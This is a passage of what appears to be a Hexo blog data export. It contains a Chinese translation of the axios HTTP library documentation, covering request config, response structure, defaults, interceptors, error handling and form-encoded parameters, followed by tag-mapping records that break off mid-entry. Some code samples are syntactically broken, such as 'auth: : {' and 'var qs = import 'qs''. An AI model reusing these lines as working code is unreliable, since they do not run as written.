</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* ... */</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `auth` 表示应该使用 HTTP 基础验证，并提供凭据</span></span><br><span class=\"line\">  <span class=\"comment\">// 这将设置一个 `Authorization` 头，覆写掉现有的任意使用 `headers` ,</span></span><br><span class=\"line\">  <span class=\"comment\">// 设置的自定义 `Authorization`头</span></span><br><span class=\"line\">  auth: &#123;</span><br><span class=\"line\">    username: <span class=\"string\">'janedoe'</span>,</span><br><span class=\"line\">    password: <span class=\"string\">'s00pers3cret'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `responseType` 表示服务器响应的数据类型，</span></span><br><span class=\"line\">  <span class=\"comment\">// 可以是 'arraybuffer', 'blob', 'document', 'json', 'text', 'stream'</span></span><br><span class=\"line\">  responseType: <span class=\"string\">'json'</span>, <span class=\"comment\">// 默认的</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `xsrfCookieName` 是用作 xsrf token 的值的cookie的名称</span></span><br><span class=\"line\">  xsrfCookieName: <span class=\"string\">'XSRF-TOKEN'</span>, <span class=\"comment\">// default</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `xsrfHeaderName` 是承载 xsrf token 的值的 HTTP 头的名称</span></span><br><span class=\"line\">  xsrfHeaderName: <span class=\"string\">'X-XSRF-TOKEN'</span>, <span class=\"comment\">// 默认的</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `onUploadProgress` 允许为上传处理进度事件</span></span><br><span class=\"line\">  onUploadProgress: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">progressEvent</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 对原生进度事件的处理</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `onDownloadProgress` 允许为下载处理进度事件</span></span><br><span class=\"line\">  onDownloadProgress: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">progressEvent</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 对原生进度事件的处理</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `maxContentLength` 定义允许的响应内容的最大尺寸</span></span><br><span class=\"line\">  maxContentLength: <span class=\"number\">2000</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `validateStatus` 定义对于给定的HTTP 响应状态码是 resolve 或 reject  promise 。</span></span><br><span class=\"line\">  <span class=\"comment\">// 如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，</span></span><br><span class=\"line\">  <span class=\"comment\">// promise 将被 resolve; 否则，promise 将被 rejecte</span></span><br><span class=\"line\">  validateStatus: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">status</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> status &gt;= <span class=\"number\">200</span> &amp;&amp; status &lt; <span class=\"number\">300</span>; <span class=\"comment\">// 默认的</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `maxRedirects` 定义在 node.js 中 follow 的最大重定向数目</span></span><br><span class=\"line\">  <span class=\"comment\">// 如果设置为0，将不会 follow 任何重定向</span></span><br><span class=\"line\">  maxRedirects: <span class=\"number\">5</span>, <span class=\"comment\">// 默认的</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `httpAgent` 和 `httpsAgent` 分别在 node.js 中用于定义在执行 http 和 https 时使用的自定义代理。</span></span><br><span class=\"line\">  <span class=\"comment\">// 允许像这样配置选项：</span></span><br><span class=\"line\">  <span class=\"comment\">// `keepAlive` 默认没有启用</span></span><br><span class=\"line\">  httpAgent: <span class=\"keyword\">new</span> http.Agent(&#123; <span class=\"attr\">keepAlive</span>: <span class=\"literal\">true</span> &#125;),</span><br><span class=\"line\">  httpsAgent: <span class=\"keyword\">new</span> https.Agent(&#123; <span class=\"attr\">keepAlive</span>: <span class=\"literal\">true</span> &#125;),</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 'proxy' 定义代理服务器的主机名称和端口</span></span><br><span class=\"line\">  <span class=\"comment\">// `auth` 表示 HTTP 基础验证应当用于连接代理，并提供凭据</span></span><br><span class=\"line\">  <span class=\"comment\">// 这将会设置一个 `Proxy-Authorization` 头，</span></span><br><span class=\"line\">  <span class=\"comment\">// 覆写掉已有的通过使用 `header` 设置的自定义 `Proxy-Authorization` 头。</span></span><br><span class=\"line\">  proxy: &#123;</span><br><span class=\"line\">    host: <span class=\"string\">'127.0.0.1'</span>,</span><br><span class=\"line\">    port: <span class=\"number\">9000</span>,</span><br><span class=\"line\">    auth: : &#123;</span><br><span class=\"line\">      username: <span class=\"string\">'mikeymike'</span>,</span><br><span class=\"line\">      password: <span class=\"string\">'rapunz3l'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `cancelToken` 指定用于取消请求的 cancel token</span></span><br><span class=\"line\">  <span class=\"comment\">// （查看后面的 Cancellation 这节了解更多）</span></span><br><span class=\"line\">  cancelToken: <span class=\"keyword\">new</span> CancelToken(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">cancel</span>) </span>&#123;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"5、响应结构\"><a href=\"#5、响应结构\" class=\"headerlink\" title=\"5、响应结构\"></a><a name=\"response\">5、响应结构</a></h4><ul>\n<li><p><code>某个请求的响应包含以下信息：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">// `data` 由服务器提供的响应</span></span><br><span class=\"line\">  data: &#123;&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `status` 来自服务器响应的 HTTP 状态码</span></span><br><span class=\"line\">  status: <span class=\"number\">200</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `statusText` 来自服务器响应的 HTTP 状态信息</span></span><br><span class=\"line\">  statusText: <span class=\"string\">'OK'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `headers` 服务器响应的头</span></span><br><span class=\"line\">  headers: &#123;&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `config` 是为请求提供的配置信息</span></span><br><span class=\"line\">  config: &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用 then 时，你将接收下面这样的响应：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.get(<span class=\"string\">'/user/12345'</span>)</span><br><span class=\"line\">.then(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(response.data);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(response.status);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(response.statusText);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(response.headers);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(response.config);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"6、默认配置\"><a href=\"#6、默认配置\" class=\"headerlink\" title=\"6、默认配置\"></a><a name=\"#defaultConfig\">6、默认配置</a></h4><blockquote>\n<p>指定将被用在各个请求的配置默认值</p>\n</blockquote>\n<ul>\n<li><p><code>axios 全局默认值：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.defaults.baseURL = <span class=\"string\">'https://api.example.com'</span>;</span><br><span class=\"line\">axios.defaults.headers.common[<span class=\"string\">'Authorization'</span>] = AUTH_TOKEN;</span><br><span class=\"line\">axios.defaults.headers.post[<span class=\"string\">'Content-Type'</span>] = <span class=\"string\">'application/x-www-form-urlencoded'</span>;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>自定义实例的默认值：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 1、创建实例时设置配置的默认值</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> instance = axios.create(&#123;</span><br><span class=\"line\">  baseURL: <span class=\"string\">'https://api.example.com'</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 2、在实例已创建后修改默认值</span></span><br><span class=\"line\">instance.defaults.headers.common[<span class=\"string\">'Authorization'</span>] = AUTH_TOKEN;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>配置的优先顺序:</code><br>配置会以一个优先顺序进行合并。这个顺序是：在 lib/defaults.js 找到的库的默认值，然后是实例的 defaults 属性，最后是请求的 config 参数。后者将优先于前者。这里是一个例子：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 使用由库提供的配置的默认值来创建实例</span></span><br><span class=\"line\"><span class=\"comment\">// 此时超时配置的默认值是 `0`</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> instance = axios.create();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 覆写库的超时默认值</span></span><br><span class=\"line\"><span class=\"comment\">// 现在，在超时前，所有请求都会等待 2.5 秒</span></span><br><span class=\"line\">instance.defaults.timeout = <span class=\"number\">2500</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 为已知需要花费很长时间的请求覆写超时设置</span></span><br><span class=\"line\">instance.get(<span class=\"string\">'/longRequest'</span>, &#123;</span><br><span class=\"line\">  timeout: <span class=\"number\">5000</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"7、拦截器\"><a href=\"#7、拦截器\" class=\"headerlink\" title=\"7、拦截器\"></a><a name=\"interceptors\">7、拦截器</a></h4><ul>\n<li><p><code>在请求或响应被 then 或 catch 处理前拦截它们：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 添加请求拦截器</span></span><br><span class=\"line\">axios.interceptors.request.use(<span class=\"function\">(<span class=\"params\">config</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 在发送请求之前做些什么</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> config;</span><br><span class=\"line\">&#125;, (error) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 对请求错误做些什么</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.reject(error);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 添加响应拦截器</span></span><br><span class=\"line\">axios.interceptors.response.use(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 对响应数据做点什么</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> response;</span><br><span class=\"line\">&#125;, (error) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 对响应错误做点什么</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.reject(error);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>如果你想在稍后移除拦截器，可以这样：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 使用拦截器</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> myInterceptor = axios.interceptors.request.use(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;<span class=\"comment\">/*...*/</span>&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 移除拦截器</span></span><br><span class=\"line\">axios.interceptors.request.eject(myInterceptor);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>可以为自定义 axios 实例添加拦截器：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> instance = axios.create();</span><br><span class=\"line\">instance.interceptors.request.use(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;<span class=\"comment\">/*...*/</span>&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"8、错误处理\"><a href=\"#8、错误处理\" class=\"headerlink\" title=\"8、错误处理\"></a><a name=\"handleErr\">8、错误处理</a></h4><ul>\n<li><p><code>常见的错误处理方式：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.get(<span class=\"string\">'/user/12345'</span>)</span><br><span class=\"line\">  .catch(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (error.response) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 请求已发出，但服务器响应的状态码不在 2xx 范围内</span></span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(error.response.data);</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(error.response.status);</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(error.response.headers);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// Something happened in setting up the request that triggered an Error</span></span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">'Error'</span>, error.message);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(error.config);</span><br><span class=\"line\">  &#125;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>可以使用 validateStatus 配置选项定义一个自定义 HTTP 状态码的错误范围：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.get(<span class=\"string\">'/user/12345'</span>, &#123;</span><br><span class=\"line\">  validateStatus: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">status</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> status &lt; <span class=\"number\">500</span>; <span class=\"comment\">// 状态码在大于或等于500时才会 reject</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"9、使用-application-x-www-form-urlencoded-格式的请求参数\"><a href=\"#9、使用-application-x-www-form-urlencoded-格式的请求参数\" class=\"headerlink\" title=\"9、使用 application/x-www-form-urlencoded 格式的请求参数\"></a><a name=\"applicationForm\">9、使用 <code>application/x-www-form-urlencoded</code> 格式的请求参数</a></h4><blockquote>\n<p>默认情况下，axios将JavaScript对象序列化为JSON，即 <code>application/json</code> 。要以 <code>application/x-www-form-urlencoded</code> 格式发送数据，您可以使用以下选项之一。</p>\n</blockquote>\n<ul>\n<li><p><code>浏览器</code><br>在浏览器中，您可以使用URLSearchParams API，如下所示：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> params = <span class=\"keyword\">new</span> URLSearchParams();</span><br><span class=\"line\">params.append(<span class=\"string\">'param1'</span>, <span class=\"string\">'value1'</span>);</span><br><span class=\"line\">params.append(<span class=\"string\">'param2'</span>, <span class=\"string\">'value2'</span>);</span><br><span class=\"line\">axios.post(<span class=\"string\">'/foo'</span>, params);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 值得注意的是，并不是所有的浏览器都支持 `URLSearchParams`，</span></span><br><span class=\"line\"><span class=\"comment\">// 但是可以借助 `polyfill` 来解决</span></span><br></pre></td></tr></table></figure>\n<p>也可以使用 <a href=\"https://github.com/ljharb/qs\" target=\"_blank\" rel=\"noopener\"><code>qs</code></a> 库来编码请求参数：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> qs = <span class=\"keyword\">import</span> <span class=\"string\">'qs'</span>;</span><br><span class=\"line\">axios.post(<span class=\"string\">'/foo'</span>, qs.stringify(&#123; <span class=\"string\">'bar'</span>: <span class=\"number\">123</span> &#125;));</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>Node.js</code><br>在 <code>node.js</code> 中，可以使用 <a href=\"https://nodejs.org/api/querystring.html\" target=\"_blank\" rel=\"noopener\"><code>querystring</code></a> 模块：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> querystring = <span class=\"keyword\">import</span> <span class=\"string\">'querystring'</span>;</span><br><span class=\"line\">axios.post(<span class=\"string\">'http://something.com/'</span>, querystring.stringify(&#123; <span class=\"attr\">foo</span>: <span class=\"string\">'bar'</span> &#125;));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 当然也可以使用 `qs` 库</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"10、使用必看\"><a href=\"#10、使用必看\" class=\"headerlink\" title=\"10、使用必看\"></a><a name=\"notes\">10、使用必看</a></h4><ul>\n<li><p><code>更新说明：</code><br>在axios达到1.0版本之前，重大更改将以新的次要版本发布。例如0.5.1和0.5.4将具有相同的API，但0.6.0将具有重大变化。</p>\n</li>\n<li><p><code>Promise：</code><br>axios依赖于原生ES6 <code>Promise</code> 实现的支持。如果您的环境不支持ES6 Promise，则可以使用 <a href=\"https://github.com/stefanpenner/es6-promise\" target=\"_blank\" rel=\"noopener\">polyfill</a>。</p>\n</li>\n</ul>\n<p style=\"text-align: right\">参考文档 <a href=\"https://www.npmjs.com/package/axios\" target=\"_blank\" rel=\"noopener\">axios</a></p>"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cjfhshvsp0001s4c089vcnx79","tag_id":"cjfhshvt30003s4c0sf8l3cpm","_id":"cjfhshvtq000fs4c0h8ranhaj"},{"post_id":"cjfhshvsp0001s4c089vcnx79","tag_id":"cjfhshvtc0007s4c0hq8denn4","_id":"cjfhshvts000hs4c0lgcus35m"},{"post_id":"cjfhshvsp0001s4c089vcnx79","tag_id":"cjfhshvth000as4c0n80o9yda","_id":"cjfhshvtv000ks4c086onxpuu"},{"post_id":"cjfhshvtr000gs4c02tco6gmi","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvtx000ms4c0uhx9k23x"},{"post_id":"cjfhshvtu000js4c0ki2lfef7","tag_id":"cjfhshvt30003s4c0sf8l3cpm","_id":"cjfhshvu1000ps4c020jlkh9f"},{"post_id":"cjfhshvtw000ls4c0y28l5p7g","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvu3000rs4c02rd1rukv"},{"post_id":"cjfhshvt00002s4c0tv6wxcew","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvu6000us4c0iyp9sdku"},{"post_id":"cjfhshvt00002s4c0tv6wxcew","tag_id":"cjfhshvtt000is4c02iudj4u3","_id":"cjfhshvu8000ws4c02te93hpk"},{"post_id":"cjfhshvtz000ns4c0ji79ityt","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvub000ys4c0mpv0hos5"},{"post_id":"cjfhshvt60004s4c0cyosrh0h","tag_id":"cjfhshvu0000os4c0glu6l9ko","_id":"cjfhshvud0011s4c0yvj8tqea"},{"post_id":"cjfhshvu9000xs4c0jbjpfj2l","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvuf0013s4c09vb5ozwm"},{"post_id":"cjfhshvuc0010s4c0fqj1i77l","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvuj0015s4c0vlcv6v8r"},{"post_id":"cjfhshvue0012s4c0r4bfim7k","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvuk0016s4c0dc95zlnt"},{"post_id":"cjfhshvt80005s4c0vq7mbubp","tag_id":"cjfhshvu5000ts4c0josgy4ky","_id":"cjfhshvul0018s4c0tqqvtbjg"},{"post_id":"cjfhshvt80005s4c0vq7mbubp","tag_id":"cjfhshvub000zs4c07vm84fb9","_id":"cjfhshvum0019s4c0ticyxf7z"},{"post_id":"cjfhshvt80005s4c0vq7mbubp","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvun001bs4c0sumei136"},{"post_id":"cjfhshvta0006s4c09an6oacu","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvup001ds4c079xgcp72"},{"post_id":"cjfhshvta0006s4c09an6oacu","tag_id":"cjfhshvum001as4c0sht2wrwe","_id":"cjfhshvuq001es4c0dw931z50"},{"post_id":"cjfhshvtd0008s4c0pn8ovebh","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvur001gs4c06brtukfe"},{"post_id":"cjfhshvtf0009s4c0pesz5deg","tag_id":"cjfhshvuq001fs4c0zde9rs6a","_id":"cjfhshvut001js4c0ktb0cf6i"},{"post_id":"cjfhshvtf0009s4c0pesz5deg","tag_id":"cjfhshvur001hs4c04nwa919w","_id":"cjfhshvuu001ks4c0j3wn8ff6"},{"post_id":"cjfhshvtk000bs4c00gzja4gr","tag_id":"cjfhshvus001is4c0zjvhdol1","_id":"cjfhshvuy001ps4c0ny5ajmb9"},{"post_id":"cjfhshvtk000bs4c00gzja4gr","tag_id":"cjfhshvuu001ls4c0g098jg94","_id":"cjfhshvuy001qs4c00uzsghh6"},{"post_id":"cjfhshvtk000bs4c00gzja4gr","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvv0001ss4c0uo5xwgpx"},{"post_id":"cjfhshvtk000bs4c00gzja4gr","tag_id":"cjfhshvub000zs4c07vm84fb9","_id":"cjfhshvv0001ts4c0yp84os4l"},{"post_id":"cjfhshvtm000cs4c0eqlbav6g","tag_id":"cjfhshvux001os4c0ktl19sy4","_id":"cjfhshvv1001vs4c0ifw7anqb"},{"post_id":"cjfhshvtp000es4c0cyyh88rt","tag_id":"cjfhshvuz001rs4c0kmg6ek55","_id":"cjfhshvv2001ws4c0z7a52244"},{"post_id":"cjfhshvu2000qs4c0jv7qrp1i","tag_id":"cjfhshvv0001us4c0mj8m2opj","_id":"cjfhshvv3001ys4c0kjh6zcrk"},{"post_id":"cjfhshvu2000qs4c0jv7qrp1i","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvv4001zs4c0yre55bxr"},{"post_id":"cjfhshvu4000ss4c0t1n61o19","tag_id":"cjfhshvv2001xs4c0ii61eujh","_id":"cjfhshvv50021s4c0el7w0mey"},{"post_id":"cjfhshvu7000vs4c0owzc17pl","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvv60022s4c0eqcvgmue"},{"post_id":"cjfhshvu7000vs4c0owzc17pl","tag_id":"cjfhshvub000zs4c07vm84fb9","_id":"cjfhshvv60023s4c0ml2np26a"},{"post_id":"cjfhshvve0024s4c0cy878cnj","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvvo0028s4c0h267uoh4"},{"post_id":"cjfhshvvp0029s4c02cstqt7a","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvvv002ds4c0l9li9nim"},{"post_id":"cjfhshvvp0029s4c02cstqt7a","tag_id":"cjfhshvub000zs4c07vm84fb9","_id":"cjfhshvvy002fs4c0sikv9om4"},{"post_id":"cjfhshvvt002cs4c04sxzw23m","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvw1002is4c0rflc9hgk"},{"post_id":"cjfhshvvj0026s4c0st8pdzjn","tag_id":"cjfhshvvs002bs4c0eywhtacs","_id":"cjfhshvw3002ks4c02vrca5g1"},{"post_id":"cjfhshvw4002ls4c0fi2973f5","tag_id":"cjfhshvux001os4c0ktl19sy4","_id":"cjfhshvw8002os4c0btm8z89d"},{"post_id":"cjfhshvw4002ls4c0fi2973f5","tag_id":"cjfhshvv2001xs4c0ii61eujh","_id":"cjfhshvwa002qs4c0lgk1x16n"},{"post_id":"cjfhshvw4002ls4c0fi2973f5","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvwd002ts4c05oncqw1h"},{"post_id":"cjfhshvvw002es4c06cp53rj5","tag_id":"cjfhshvw1002hs4c0ec59esaj","_id":"cjfhshvwf002vs4c0odpvzxew"},{"post_id":"cjfhshvvw002es4c06cp53rj5","tag_id":"cjfhshvw7002ns4c0omou5mh2","_id":"cjfhshvwi002ys4c0rdjkake5"},{"post_id":"cjfhshvwg002ws4c0uc88rqlc","tag_id":"cjfhshvto000ds4c0wi6mcclk","_id":"cjfhshvwl0030s4c0cq57m9de"},{"post_id":"cjfhshvvz002gs4c0qmyw03m0","tag_id":"cjfhshvwc002ss4c075qmhs62","_id":"cjfhshvwn0032s4c05axtvokj"},{"post_id":"cjfhshvvz002gs4c0qmyw03m0","tag_id":"cjfhshvwi002xs4c0yzlg5q9w","_id":"cjfhshvwn0033s4c0jfy0tr1w"},{"post_id":"cjfhshvw2002js4c0zwzo789i","tag_id":"cjfhshvw1002hs4c0ec59esaj","_id":"cjfhshvwr0037s4c03odgul21"},{"post_id":"cjfhshvw2002js4c0zwzo789i","tag_id":"cjfhshvwo0034s4c08chjcrn4","_id":"cjfhshvwr0038s4c0r8erwfwd"},{"post_id":"cjfhshvw2002js4c0zwzo789i","tag_id":"cjfhshvwp0035s4c0l51k0zad","_id":"cjfhshvws003as4c0xxh7f8hi"},{"post_id":"cjfhshvw5002ms4c0oc9yjs90","tag_id":"cjfhshvwq0036s4c0b7iehqam","_id":"cjfhshvwu003cs4c0gddnicwb"},{"post_id":"cjfhshvw5002ms4c0oc9yjs90","tag_id":"cjfhshvws0039s4c0jbkan1k4","_id":"cjfhshvwv003ds4c0r369bv15"},{"post_id":"cjfhshvw8002ps4c0srjezvgw","tag_id":"cjfhshvwt003bs4c00rbbcp8x","_id":"cjfhshvww003fs4c0ws8qrd5f"},{"post_id":"cjfhshvwb002rs4c0w0ww6z6n","tag_id":"cjfhshvwv003es4c0d66